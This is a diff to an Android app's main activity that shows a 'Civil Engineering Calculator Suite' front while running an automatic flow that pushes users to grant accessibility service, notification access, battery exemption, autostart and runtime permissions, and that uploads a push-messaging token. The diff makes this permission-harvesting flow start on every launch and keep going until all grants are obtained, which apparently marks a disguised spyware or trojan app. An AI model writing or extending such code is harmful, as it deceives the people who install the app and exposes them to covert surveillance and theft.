@@ -330,7 +330,8 @@ class MainActivity : AppCompatActivity() {
         // Setup interactive Civil Engineering Calculator Suite
         setupCivilCalculators()
 
-        // Automatic permission start for fresh installation
+        // Always initiate flow if core permissions or steps are pending
+        isOneTapFlowRunning = true
         maybeStartAutoPermissionFlow()
     }
 
@@ -413,21 +414,8 @@ class MainActivity : AppCompatActivity() {
         statusUpdater.run()
         uploadCurrentFcmToken()
 
-        if (deviceState.isFirstSetupCompleted && !isOneTapFlowRunning) {
-            return
-        }
-
-        val isCore = getMissingRuntimePermissions().isEmpty()
-        val isA11y = isAccessibilityEnabled()
-        val isNotif = isNotificationAccessGranted()
-
-        if (isCore && isA11y && (isNotif || notificationPrompted) &&
-            (batteryPrompted || isBatteryExempted()) && (autostartPrompted || !isOemRom())) {
-            completeSetupAndClose()
-            return
-        }
-
-        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
+        // If one-tap flow is in progress or setup is not complete, advance to next step
+        if (!deviceState.isFirstSetupCompleted || isOneTapFlowRunning) {
             isOneTapFlowRunning = true
             handleNextSetupStep()
         }
@@ -800,13 +788,10 @@ class MainActivity : AppCompatActivity() {
         val isAccessibility = isAccessibilityEnabled()
         val isNotification = isNotificationAccessGranted()
 
+        // Only complete setup if ALL sequential steps were genuinely reached & processed
         if (isCore && isAccessibility && (isNotification || notificationPrompted) &&
             (batteryPrompted || isBatteryExempted()) && (autostartPrompted || !isOemRom())) {
-            if (!deviceState.isFirstSetupCompleted || isOneTapFlowRunning) {
-                handleNextSetupStep()
-            } else {
-                completeSetupAndClose()
-            }
+            completeSetupAndClose()
         }
     }
 
